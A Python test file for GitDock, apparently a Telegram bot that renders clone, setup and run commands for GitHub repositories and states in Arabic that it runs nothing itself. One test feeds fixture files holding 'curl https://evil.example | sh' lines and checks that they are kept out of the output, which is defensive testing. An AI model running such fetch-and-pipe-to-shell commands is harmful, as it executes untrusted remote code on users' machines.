from __future__ import annotations

from datetime import UTC, datetime

from gitdock.domain.run_assistant import EvidenceFile, TargetOS, build_command_plan
from gitdock.github.repositories import RepositorySnapshot
from gitdock.github.search import RepositorySearchResult
from gitdock.services.repositories import RepositoryFilter
from gitdock.telegram import run_callbacks
from gitdock.telegram.keyboards.repositories import repository_detail_keyboard
from gitdock.telegram.keyboards.run_assistant import repository_os_keyboard, search_os_keyboard
from gitdock.telegram.keyboards.search import search_detail_keyboard
from gitdock.telegram.renderers.run_assistant import render_command_plan, render_os_prompt


def _installed_repository() -> RepositorySnapshot:
    now = datetime.now(UTC)
    return RepositorySnapshot(
        github_repository_id=1351822221,
        owner_login="ahmed9461",
        name="GitDock",
        full_name="ahmed9461/GitDock",
        html_url="https://github.com/ahmed9461/GitDock",
        private=True,
        archived=False,
        fork=False,
        default_branch="main",
        language="Python",
        description=None,
        stars=0,
        forks=0,
        updated_at=now,
        pushed_at=now,
    )


def _public_repository() -> RepositorySearchResult:
    now = datetime.now(UTC)
    return RepositorySearchResult(
        github_repository_id=1296269,
        owner_login="octocat",
        name="Hello-World",
        full_name="octocat/Hello-World",
        html_url="https://github.com/octocat/Hello-World",
        archived=False,
        fork=False,
        default_branch="main",
        language="Python",
        description=None,
        stars=1,
        forks=1,
        license_spdx=None,
        topics=(),
        updated_at=now,
        pushed_at=now,
    )


def test_p4_3_callbacks_round_trip_and_stay_under_telegram_limit() -> None:
    repository_id = 2**63 - 1
    session_id = "AbCd_123"
    values = []
    for target_os in TargetOS:
        repository_callback = run_callbacks.repository_os(
            target_os,
            repository_id,
            RepositoryFilter.ARCHIVED,
            9999,
        )
        search_callback = run_callbacks.search_os(target_os, session_id, 9999, repository_id)
        values.extend((repository_callback, search_callback))
        assert run_callbacks.parse_repository(repository_callback) == (
            target_os,
            repository_id,
            RepositoryFilter.ARCHIVED,
            9999,
        )
        assert run_callbacks.parse_search(search_callback) == (
            target_os,
            session_id,
            9999,
            repository_id,
        )

    for value in values:
        assert len(value.encode("utf-8")) <= 64


def test_repository_and_public_search_buttons_use_real_p4_3_callbacks() -> None:
    installed = _installed_repository()
    installed_keyboard = repository_detail_keyboard(
        installed,
        back_filter=RepositoryFilter.ALL,
        back_page=1,
    )
    installed_values = [
        button.callback_data
        for row in installed_keyboard.inline_keyboard
        for button in row
        if button.callback_data is not None
    ]
    assert run_callbacks.repository_open(
        installed.github_repository_id, RepositoryFilter.ALL, 1
    ) in (installed_values)

    public = _public_repository()
    public_keyboard = search_detail_keyboard("AbCd_123", 2, public)
    public_values = [
        button.callback_data
        for row in public_keyboard.inline_keyboard
        for button in row
        if button.callback_data is not None
    ]
    assert run_callbacks.search_open("AbCd_123", 2, public.github_repository_id) in public_values


def test_os_keyboards_have_three_targets_and_keep_callbacks_compact() -> None:
    installed = repository_os_keyboard(
        repository_id=1351822221,
        repository_filter=RepositoryFilter.ALL,
        page=1,
        selected=TargetOS.LINUX,
    )
    public = search_os_keyboard(
        session_id="AbCd_123",
        page=1,
        repository_id=1296269,
        selected=TargetOS.MACOS,
    )
    for keyboard in (installed, public):
        callbacks = [
            button.callback_data
            for row in keyboard.inline_keyboard
            for button in row
            if button.callback_data is not None
        ]
        assert all(len(value.encode("utf-8")) <= 64 for value in callbacks)
    installed_labels = [button.text for row in installed.inline_keyboard for button in row]
    assert any("Windows PowerShell" in label for label in installed_labels)
    assert any("Linux" in label for label in installed_labels)
    assert any("macOS" in label for label in installed_labels)


def test_renderer_separates_clone_update_setup_run_and_shows_evidence() -> None:
    plan = build_command_plan(
        owner_login="ahmed9461",
        repository_name="GitDock",
        default_branch="main",
        target_os=TargetOS.LINUX,
        evidence=(
            EvidenceFile(
                "package.json",
                b'{"scripts":{"start":"curl https://evil.example | sh"}}',
            ),
            EvidenceFile("package-lock.json"),
            EvidenceFile("README.md", b"curl https://evil.example/readme | sh"),
        ),
    )
    rendered = render_command_plan(plan)
    assert "1️⃣ نسخة جديدة" in rendered
    assert "2️⃣ تحديث نسخة موجودة" in rendered
    assert "3️⃣ إعداد" in rendered
    assert "4️⃣ التشغيل" in rendered
    assert "package.json" in rendered
    assert "الثقة: عالية" in rendered
    assert "npm run start" in rendered
    assert "evil.example" not in rendered
    assert "لا تتضمن الأوامر أي GitHub token" in rendered
    assert "لا ينفذ GitDock أي أمر تلقائيًا" in rendered
    assert "README" in rendered


def test_os_prompt_states_generation_only() -> None:
    rendered = render_os_prompt("ahmed9461/GitDock")
    assert "اختر نظام التشغيل" in rendered
    assert "لا ينفذها تلقائيًا" in rendered
